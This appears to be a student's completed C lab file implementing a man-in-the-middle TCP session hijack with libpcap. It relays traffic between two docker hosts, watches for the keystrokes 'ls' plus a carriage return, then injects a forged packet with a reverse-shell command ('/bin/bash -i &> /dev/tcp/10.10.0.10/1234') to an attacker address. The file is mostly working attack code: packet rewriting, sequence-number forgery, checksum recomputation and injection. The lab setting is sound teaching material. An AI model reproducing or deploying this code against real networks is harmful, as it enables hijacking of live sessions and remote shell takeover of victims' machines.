// SPDX-License-Identifier: Unlicense

#include <arpa/inet.h>
#include <linux/tcp.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <pcap.h>
#include <pcap/pcap.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "log.h"
#include "tcp_util.h"
#include "util.h"

// These addresses are now hardcoded into the docker-compose file.
#define HOST_A_MAC "0a:1a:5d:92:0a:20"
#define HOST_B_MAC "7e:8f:c5:5e:f3:09"

char prevLetter = '\0';
char prevLetter2 = '\0';

static int
is_triggered(struct iphdr *iphdr, struct tcphdr *tcphdr)
{
  // TODO
  // =====
  //   Add your implementation to catch the trigger here.
  //
  //   _Hint_: You might need to track information across packets here. You can
  //           use global variables or static variables.
  if (tcphdr->ack && tcphdr->psh) {
    uint16_t tcp_hdr_len = tcphdr->doff * 4;
    char *data = (char *) tcphdr + tcp_hdr_len;
    //printf("prev letter is: %c\n", prevLetter);
    if (*data == '\r' && prevLetter == 's' && prevLetter2 == 'l') {
      prevLetter2 = prevLetter;
      prevLetter = *data;
      return 1;
    } else if (*data == 's' && prevLetter == 's') {
      return 0;
    } else {
      prevLetter2 = prevLetter;
      prevLetter = *data;
      return 0;
    }
  }
  return 0;
}

static u_char *
hijack_tcp_connect(const u_char *pkt, struct iphdr *ip, struct tcphdr *tcp,
                   const char *cmd, size_t *len)
{
  print_log("Running the TCP session hijacking code...\n");
  // TODO
  // =====
  //  Add your implementation for the TCP session hijacking here...
  //
  //  1. Compute the length of your modified packet
  size_t new_len = *len + strlen(cmd) -1;
  
  //  2. Allocate space for that packet using malloc
  u_char *new_pkt = (u_char *)malloc(new_len);

  //  3. Copy over the pkt into your return packet
  //     WARNING:
  //     return packet is longer than packet, you need to grab the
  //     original packet length to know how much to copy. OR copy the headers
  //     one by one.
  memcpy(new_pkt, pkt, *len);
  
  //  4. Grab new reference to the ip and tcp headers.
  struct ether_header *eth = (struct ether_header *)new_pkt;
  struct iphdr *new_ip = (struct iphdr *)(new_pkt + sizeof *eth);
  struct tcphdr *new_tcp = (struct tcphdr *)(new_pkt + sizeof *eth + sizeof *new_ip);

  new_ip = (struct iphdr *)(new_pkt + sizeof *eth);
  new_tcp = (struct tcphdr *)(new_pkt + sizeof *eth + sizeof *new_ip);

  //  5. Set the new sequence number (we want this to be in the future).
  size_t payload_len = 1;
  new_tcp->seq = htonl(ntohl(tcp->seq) + payload_len);
  //new_tcp->ack_seq = htonl(ntohl(tcp->ack_seq) + payload_len);
  new_tcp->ack_seq = tcp->ack_seq;

  //  6. Write the data into your packet. What should the command start and end
  //     with?
  uint16_t tcp_hdr_len = new_tcp->doff * 4;
  char *data = (char *) new_tcp + tcp_hdr_len;
  memcpy(data, cmd, strlen(cmd));

  //  7. Update the packet's total length tot_len field given your changes.
  size_t increased = strlen(cmd) - 1;
  new_ip->tot_len = htons(ntohs(ip->tot_len) + increased);

  //  8. Compute checksums over ip and tcp headers.
  new_ip->check = 0;
  new_ip->check = chksum((uint16_t *)new_ip, new_ip->ihl * 4);
  new_tcp->check = 0;
  new_tcp->check = compute_tcp_checksum(new_tcp, new_ip);

  //  9. Set *len to the new packet length and return the new packet.
  *len = new_len;
  return new_pkt;
}

void
parse_tcp(const u_char *pkt, const char *my_mac_addr, pcap_t *handle,
          unsigned len)
{
  struct iphdr *ip;
  struct tcphdr *tcp;
  struct ether_header *eth;
  struct ether_addr *eth_addr;
  static struct in_addr host_a_addr;
  static struct in_addr host_b_addr;

  // new packet to send out
  size_t nlen  = 0;
  u_char *npkt = 0;

  eth = (struct ether_header *)pkt;
  ip  = (struct iphdr *)(pkt + sizeof *eth);
  tcp = (struct tcphdr *)(pkt + sizeof *eth + sizeof *ip);

  inet_aton("10.10.0.4", &host_a_addr);
  inet_aton("10.10.0.5", &host_b_addr);

  // TODO:
  //  Remove these lines, they're only here to silence the compiler.
  (void)tcp;
  (void)eth_addr;

  // TODO:
  //=====
  //   Complete this function to parse a TCP packet and then modify its content
  //   to replace everything with a letter of your choice (or choose something
  //   more fun)!

  // 1. You will need to fix the Ethernet header's source and destination MAC
  //    addresses, depending on where it's coming from.
  if(ip->saddr == host_a_addr.s_addr) {
    // packet coming from host a to host b, how should it reach b?
    eth_addr = ether_aton(my_mac_addr);
    memcpy(eth->ether_shost, eth_addr->ether_addr_octet, sizeof eth->ether_shost);
    eth_addr = ether_aton(HOST_B_MAC);
    memcpy(eth->ether_dhost, eth_addr->ether_addr_octet, sizeof eth->ether_dhost);

  } else if(ip->saddr == host_b_addr.s_addr) {
    // packet coming from host b to host a, how should it reach a?
    eth_addr = ether_aton(my_mac_addr);
    memcpy(eth->ether_shost, eth_addr->ether_addr_octet, sizeof eth->ether_shost);
    eth_addr = ether_aton(HOST_A_MAC);
    memcpy(eth->ether_dhost, eth_addr->ether_addr_octet, sizeof eth->ether_dhost);
  }

  
  // 2. Check if the packet contains the trigger.
  //    NOTE: is_triggered might need to work across packets.
  if(is_triggered(ip, tcp)) {
    nlen = len;
    //npkt = hijack_tcp_connect(pkt, ip, tcp, "\rtouch /volumes/pwnd.txt\r", &nlen);
    npkt = hijack_tcp_connect(pkt, ip, tcp, "\r/bin/bash -i &> /dev/tcp/10.10.0.10/1234 0<&1\r", &nlen);
    if (nlen > 0) {
      //sleep(1);
      int nrc = pcap_inject(handle, npkt, nlen);
      free(npkt);
      if(nrc == PCAP_ERROR_NOT_ACTIVATED) {
        print_err("Pcap was not actived!\n");
        exit(EXIT_FAILURE);
      } else if(nrc == PCAP_ERROR) {
        print_err("Pcap error: %s\n", pcap_geterr(handle));
        exit(EXIT_FAILURE);
      }
    } else {
      print_err("nlen is zero/negative.\n");
      exit(EXIT_FAILURE);
    }
  }

  // 3. Compute checksum for both the TCP header and the IP header.
  //    COPY THIS OVER FROM LAB 07
  tcp->check = 0;
  tcp->check = compute_tcp_checksum(tcp, ip);

  // 4. Send the packet, this is the same code from previous labs.
  int rc = pcap_inject(handle, pkt, len);
  if(rc == PCAP_ERROR_NOT_ACTIVATED) {
    print_err("Pcap was not actived!\n");
    exit(EXIT_FAILURE);
  } else if(rc == PCAP_ERROR) {
    print_err("Pcap error: %s\n", pcap_geterr(handle));
    exit(EXIT_FAILURE);
  }

}

uint16_t
compute_tcp_checksum(struct tcphdr *tcp, struct iphdr *ip)
{
  unsigned long cksum = 0;
  uint16_t tcplen     = ntohs(ip->tot_len) - (ip->ihl * 4);
  struct pseudo_tcp_hdr pseudohdr;
  uint16_t *hdr;
  uint32_t len;

  // make sure this is zero.
  tcp->check = 0;

  // fill up the pseudo header
  pseudohdr.saddr   = ip->saddr;
  pseudohdr.daddr   = ip->daddr;
  pseudohdr.zero    = 0;
  pseudohdr.ptcl    = ip->protocol;
  pseudohdr.tcp_len = htons(tcplen);

  // start over the pseudoheader
  len = sizeof pseudohdr;
  hdr = (uint16_t *)(&pseudohdr);
  while(len > 1) {
    cksum += *hdr++;
    len -= sizeof(uint16_t);
  }

  // pseudo header is always 96 bits or 24 bytes, which means len is 0 now.
  len = tcplen;
  hdr = (uint16_t *)tcp;
  while(len > 1) {
    cksum += *hdr++;
    len -= sizeof(uint16_t);
  }

  if(len)
    cksum += *(u_char *)hdr;

  cksum = (cksum >> 16) + (cksum & 0xffff);
  cksum += (cksum >> 16);

  return (uint16_t)~cksum;
}
